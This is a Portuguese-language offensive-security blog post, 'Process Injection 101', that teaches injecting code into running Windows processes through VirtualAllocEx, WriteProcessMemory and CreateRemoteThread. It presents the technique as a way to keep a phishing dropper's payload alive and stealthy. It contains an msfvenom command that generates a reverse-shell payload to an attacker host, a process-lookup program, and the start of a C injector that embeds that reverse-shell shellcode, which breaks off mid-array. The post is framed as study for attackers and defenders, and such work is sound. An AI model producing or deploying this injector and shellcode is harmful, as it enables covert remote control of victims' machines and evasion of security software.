<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Process Injection 101" /><meta name="author" content="H41stur" /><meta property="og:locale" content="en" /><meta name="description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><meta property="og:description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><link rel="canonical" href="https://h41stur.github.io/posts/process-injection/" /><meta property="og:url" content="https://h41stur.github.io/posts/process-injection/" /><meta property="og:site_name" content="H41stur" /><meta property="og:image" content="https://h41stur.github.io/img/posts/process-injection.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-08-07T01:00:00-03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://h41stur.github.io/img/posts/process-injection.png" /><meta property="twitter:title" content="Process Injection 101" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@H41stur" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H41stur"},"dateModified":"2024-08-12T19:15:31-03:00","datePublished":"2024-08-07T01:00:00-03:00","description":"“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”","headline":"Process Injection 101","image":"https://h41stur.github.io/img/posts/process-injection.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://h41stur.github.io/posts/process-injection/"},"url":"https://h41stur.github.io/posts/process-injection/"}</script><title>Process Injection 101 | H41stur</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="H41stur"><meta name="application-name" content="H41stur"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://h41stur.github.io/img/h41stur.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">H41stur</a></div><div class="site-subtitle font-italic">Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARQUIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>SOBRE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/h41stur" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['leonardor.toledo','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/leo-toledo/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Process Injection 101</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Process Injection 101</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> H41stur </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Aug 7, 2024, 1:00 AM -0300" >Aug 7, 2024<i class="unloaded">2024-08-07T01:00:00-03:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Aug 12, 2024, 7:15 PM -0300" >Aug 12, 2024<i class="unloaded">2024-08-12T19:15:31-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="8294 words">46 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="/img/posts/process-injection.png" alt="Process Injection-101" /></p><h1 id="tldr">TL;DR</h1><p>Neste artigo, exploramos a técnica de <em>Process Injection</em>, uma abordagem avançada que permite a injeção de código em processos legítimos em execução. Amplamente utilizada em cenários de segurança ofensiva, essa técnica facilita a execução furtiva de código, aproveitando os privilégios e recursos dos processos alvo. Abordamos diferentes métodos de <em>Process Injection</em>, como o uso de APIs específicas e exploração de vulnerabilidades, fornecendo exemplos práticos que conectam conceitos teóricos à aplicação real. O domínio dessas técnicas é essencial para profissionais que buscam aprofundar seu conhecimento em manipulação de processos e desenvolver habilidades robustas para a defesa contra ameaças avançadas. Compreender e praticar essas metodologias prepara os defensores para enfrentar e mitigar ataques sofisticados no cenário atual de cibersegurança.</p><h1 id="introdução">Introdução</h1><p>Seguindo a série de artigos que vem explorando os <em>shellcodes</em>, exploração de WinAPI e afins, acredito que explorar o conhecimento base para o <em>process injection</em>, é essencial no processo de aprendizagem.</p><p><em>Process Injection</em> é uma técnica usada por atacantes para injetar código malicioso em processos legítimos que já estão em execução no sistema operacional. O objetivo dessa técnica é executar código de maneira furtiva, evitando a detecção por softwares de segurança e aproveitando os privilégios e recursos dos processos injetados. Executar código no contexto de outro processo pode permitir acesso à memória do processo, recursos de sistema/rede e possivelmente privilégios elevados.</p><p>Há muitas maneiras de injetar código em um processo, muitas das quais abusam de funcionalidades legítimas. Essas implementações existem para todos os principais sistemas operacionais, mas geralmente são específicas da plataforma.</p><p>Estas técnicas são amplamente utilizadas por criminosos e existe até mesmo uma <a href="https://attack.mitre.org/techniques/T1055/">sessão completa</a> sobre o assunto no <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a>.</p><p>A intenção deste artigo é mostrar o pensamento introdutório no processo de <em>process injection</em> com as técnicas mais básicas com o intuito de gerar entendimento e curiosidade.</p><p>Este artigo utilizará de recursos desenvolvidos nos artigos anteriores, portanto, caso não se sinta familiarizado com alguns temas abordados, recomendo a leitura antecipada na seguinte ordem:</p><ul><li><a href="https://h41stur.com/posts/shellcoding101/">Shellcoding 101</a><li><a href="https://h41stur.com/posts/evasao-av/">Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</a><li><a href="https://h41stur.com/posts/get-process/">Enumerando Processos pelo Nome</a></ul><h1 id="o-processo">“O” Processo</h1><p>Existem infinitos motivos para se querer injetar algo em um processo, sua criatividade e necessidade ditarão as regras, você pode ter um <em>dropper</em> que foi entregue à vítima em um ataque de <em>phishing</em>, que esteja contido em uma planilha do <strong>Excel</strong>, ou um documento de texto, ou um PDF qualquer, tipos de ação que acontecem com frequência <em>in the wild</em>.</p><p>O que acontece, é que estes tipos de arquivo tem vida útil limitada, ou seja, seu <em>payload</em> foi executado quando a vítima abriu aquela planilha do Excel e gerou, por exemplo, um <em>shell</em> reverso, mas assim que a planilha for fechada a conexão se perde. Este seria um grande motivo para injetar o código malicioso em outro processo que esteja em execução, um que tenha vida útil mais longa ou que até mesmo seja mais <em>stealth</em>.</p><p>De forma bem simplificada, o conceito básico de <em>process injection</em> consiste em escolher um processo alvo que já esteja em execução.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240807153306.png" alt="" /></p><p>Em seguida, alocamos um espaço de memória dentro deste processo que já está em execução, este <em>buffer</em> de memória precisa ser no mínimo do tamanho do <em>payload</em> a ser injetado.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240807153431.png" alt="" /></p><p>O próximo passo é copiar este <em>payload</em> para dentro do espaço alocado.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240807153629.png" alt="" /></p><p>E por último, pedimos ao SO para executar o que contém neste espaço de memória, ou seja, nosso <em>payload</em>, no processo alvo.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240807154257.png" alt="" /></p><p>O resultado deste processo, será que o <em>payload</em> não será executado pelo <code class="language-plaintext highlighter-rouge">dropper.exe</code> e sim pelo <code class="language-plaintext highlighter-rouge">notepad.exe</code>, mesmo que o <em>dropper</em> seja fechado, o <em>payload</em> continuará em execução em outro processo (pelo menos até o Notepad ser fechado, mas aí é questão de escolher bem os processos).</p><h2 id="debuggers-everywhere"><em>Debuggers everywhere</em></h2><p>Conceitualmente é bem simples (na prática, também), as implementações das APIs do Windows voltadas para <em>debuggers</em> fornecem as ferramentas necessárias, e, sistematicamente, utilizaremos 3 delas neste processo.</p><p>A função <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a> permite reservar, confirmar ou alterar o estado de uma região de memória em um processo específico.</p><p>Sua sintaxe é:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">LPVOID</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>  <span class="n">flProtect</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Onde:</p><ul><li><code class="language-plaintext highlighter-rouge">[in] hProcess</code> é um <em>handle</em> para um processo em execução no qual a função irá alocar um espaço de memória. Este <em>handle</em> é facilmente obtido com a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess</a> passando o PID do processo desejado;<li><code class="language-plaintext highlighter-rouge">[in, optional] lpAddress</code> é um ponteiro que especifica o endereço de início da região onde desejamos alocar um <em>buffer</em>, se for configurado como <code class="language-plaintext highlighter-rouge">NULL</code> a própria função determina este endereço;<li><code class="language-plaintext highlighter-rouge">[in] dwSize</code> é o tamanho do <em>buffer</em> a ser alocado em <em>bytes</em>;<li><code class="language-plaintext highlighter-rouge">[in] flAllocationType</code> determina o tipo de alocação de memória, para reservarmos e confirmarmos a região da memória, podemos utilizar a combinação <code class="language-plaintext highlighter-rouge">MEM_RESERVE | MEM_COMMIT</code>;<li><code class="language-plaintext highlighter-rouge">[in] flProtect</code> determina o tipo da proteção utilizada no <em>buffer</em>, como criaremos um espaço onde faremos escrita, leitura e execução, será configurado como <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READWRITE</code>.</ul><p>Se esta função tiver sucesso, ela retorna o endereço base da região de memória alocada.</p><p>A função <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a> escreve dados em uma área de memória específica em um processo. É importante que esta área tenha permissão para escrita, por este motivo, quando criamos o <em>buffer</em> utilizamos o parâmetro <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READWRITE</code>.</p><p>Sua sintaxe é:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">BOOL</span> <span class="nf">WriteProcessMemory</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">HANDLE</span>  <span class="n">hProcess</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPVOID</span>  <span class="n">lpBaseAddress</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPCVOID</span> <span class="n">lpBuffer</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">SIZE_T</span>  <span class="n">nSize</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">SIZE_T</span>  <span class="o">*</span><span class="n">lpNumberOfBytesWritten</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Onde:</p><ul><li><code class="language-plaintext highlighter-rouge">[in] hProcess</code> é um <em>handle</em> para um processo em execução para qual a função irá escrever os dados;<li><code class="language-plaintext highlighter-rouge">[in] lpBaseAddress</code> é um ponteiro para o endereço base onde os dados serão escritos, ou seja, o retorno da função <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code>;<li><code class="language-plaintext highlighter-rouge">[in] lpBuffer</code> é um ponteiro para o <em>buffer</em> que <strong>contém</strong> os dados a serem gravados, ou seja, um ponteiro para o <em>payload</em>;<li><code class="language-plaintext highlighter-rouge">[in] nSize</code> a quantidade de <em>bytes</em> a serem gravados;<li><code class="language-plaintext highlighter-rouge">[out] lpNumberOfBytesWritten</code> um parâmetro opcional que indica um ponteiro que recebe a quantidade de <em>bytes</em> a serem copiados. Pode ser configurado como <code class="language-plaintext highlighter-rouge">NULL</code>.</ul><p>Por último, a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a> cria uma <em>thread</em> que é executada no espaço de endereço virtual de outro processo.</p><p>Sua sintaxe é:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="n">HANDLE</span> <span class="nf">CreateRemoteThread</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">HANDLE</span>                 <span class="n">hProcess</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPSECURITY_ATTRIBUTES</span>  <span class="n">lpThreadAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">SIZE_T</span>                 <span class="n">dwStackSize</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPTHREAD_START_ROUTINE</span> <span class="n">lpStartAddress</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPVOID</span>                 <span class="n">lpParameter</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">DWORD</span>                  <span class="n">dwCreationFlags</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">LPDWORD</span>                <span class="n">lpThreadId</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Onde:</p><ul><li><code class="language-plaintext highlighter-rouge">[in] hProcess</code> é um <em>handle</em> para um processo em execução no qual a função irá criar a <em>thread</em>;<li><code class="language-plaintext highlighter-rouge">[in] lpThreadAttributes</code> é um ponteiro para a estrutura <a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)">SECURITY_ATTRIBUTES</a>, se lpThreadAttributes for <code class="language-plaintext highlighter-rouge">NULL</code>, o <em>thread</em> obtém um descritor de segurança padrão e o <em>handle</em> não pode ser herdado;<li><code class="language-plaintext highlighter-rouge">[in] dwStackSize</code> o tamanho inicial da <em>stack</em> em <em>bytes</em>. Se for configurado como zero, a nova <em>thread</em> usa o tamanho padrão do executável;<li><code class="language-plaintext highlighter-rouge">[in] lpStartAddress</code> um ponteiro para a função definida pelo aplicativo do tipo <code class="language-plaintext highlighter-rouge">LPTHREAD_START_ROUTINE</code> a ser executada pelo <em>thread</em> e representa o endereço inicial do <em>thread</em> no processo remoto. Em nosso caso, o retorno da função <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code>;<li><code class="language-plaintext highlighter-rouge">[in] lpParameter</code> um ponteiro para uma variável a ser passada para a função na <em>thread</em>, em nosso caso <code class="language-plaintext highlighter-rouge">NULL</code>;<li><code class="language-plaintext highlighter-rouge">[in] dwCreationFlags</code> os sinalizadores que controlam a criação da <em>thread</em>, quando configurado como zero, a <em>thread</em> é executada imediatamente após sua criação;<li><code class="language-plaintext highlighter-rouge">[out] lpThreadId</code> um ponteiro para uma variável que recebe o identificador da <em>thread</em>, se este parâmetro for <code class="language-plaintext highlighter-rouge">NULL</code>, o identificador da <em>thread</em> não será retornado.</ul><p>Se a função for bem-sucedida, o valor de retorno será um identificador para a nova <em>thread</em>.</p><p>A junção destas funções consegue completar o ciclo descrito no modelo conceitual ilustrado.</p><h1 id="code-injection"><em>Code Injection</em></h1><p>O nosso <em>payload</em> pode ter uma infinidade de formatos, um dos mais clássicos é o <em>code injection</em>, onde um código, ou <em>shellcode</em> é injetado em um processo.</p><p>Para implementação e teste do <em>process injection</em>, além do descrito até o momento precisamos de um <em>payload</em>. A fim de poupar tempo, utilizarei o <a href="https://www.offsec.com/metasploit-unleashed/msfvenom/">MSFvenom</a> para criar um <em>payload</em> de <em>reverse shell</em>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.71.128 <span class="nv">LPORT</span><span class="o">=</span>8443 <span class="nt">-f</span> c
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240807193944.png" alt="" /></p><p>A função <code class="language-plaintext highlighter-rouge">OpenProcess</code> que retornará o <em>handle</em> para o processo alvo, precisa do PID deste processo para ser executada, nesse ponto, podemos inseri-lo manualmente, ou, como no último artigo, <a href="https://h41stur.com/posts/get-process/">Enumerando Processos pelo Nome</a>, criamos um programa que retorna o PID de um processo pesquisando pelo nome, podemos automatizar esta etapa. Abaixo o script do último artigo:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">findPID</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procName</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">HANDLE</span> <span class="n">hSnapshot</span><span class="p">;</span>
    <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">proc</span><span class="p">;</span>

    <span class="c1">// snapshot de todos os processos em execucao</span>
    <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hSnapshot</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">// inicializando dwSize</span>
    <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>

    <span class="c1">// inicio da iteracao, primeiro processo</span>
    <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>

    <span class="c1">// loop para iterar sobre os processos</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">proc</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">procName</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// fecha o handle aberto</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">pid</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">pid</span> <span class="o">=</span> <span class="n">findPID</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"PID of %s: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">pid</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Com estas informações em mãos, podemos criar o programa que fará o uso de todos os recursos necessários.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x49\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x47\x80</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81</span><span class="s">"</span>
